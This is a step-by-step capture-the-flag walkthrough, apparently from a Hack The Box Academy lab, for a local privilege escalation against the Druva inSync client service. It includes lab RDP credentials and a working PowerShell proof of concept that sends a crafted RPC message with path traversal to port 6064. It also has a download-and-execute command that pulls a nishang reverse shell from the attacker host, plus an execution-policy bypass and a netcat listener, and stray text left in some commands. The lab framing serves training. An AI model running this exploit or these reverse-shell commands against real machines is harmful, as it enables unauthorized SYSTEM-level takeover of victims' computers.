## Step-by-Step Guide to Exploit Druva inSync Vulnerability
### 📍 1. RDP into the Target Machine
Use the provided credentials to connect:

RDP to 10.129.253.88
Username: htb-student
Password: HTB_@cademy_stdnt!
```bash
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.253.88
```
### 📍 2. Verify Druva inSync is Installed and Running
Open PowerShell and run:
```bash
get-service | ? {$_.DisplayName -like 'Druva*'}
Ensure Druva inSync Client Service is running.
```
Check port 6064 is open:
```bash
netstat -ano | findstr 6064
```
### 📍 3. Prepare the Exploit on Your Kali/Parrot Attack Box
a) Create Reverse Shell Script
Download the Invoke-PowerShellTcp.ps1 script:
```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```
Edit it and append this at the end:
```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.31 (my local ip) -Port 9443
```
Make sure to replace 10.10.14.3 with your tun0 IP.

b) Start a Python Web Server
```bash
python3 -m http.server 8080
```
### 📍 4. Modify and Execute PoC PowerShell Script on Victim
a) PoC Script:
On the victim machine (RDP session), run:
```bash
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.31:8080/Invoke-PowerShellTcp.ps1')"

$ErrorActionPreference = "Stop"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
⚠️ You may need to run Set-ExecutionPolicy Bypass -Scope Process before running this.

### 📍 5. Start Netcat Listener on Your Attack Box
```bash
nc -lvnp 9443
```
Wait for the reverse shell. Once it connects, you should be NT AUTHORITY\SYSTEM.

![image](https://github.com/user-attachments/assets/ca899610-9248-4250-836f-abe5635ec316)


### 📍 6. Grab the Flag
In the SYSTEM shell:

powershell
Copy
Edit
cd "C:\Users\Administrator\Desktop\VulServices"
type flag.txt
✅ Submit the Flag
Once you copy the contents of flag.txt, paste it into the challenge submission box.
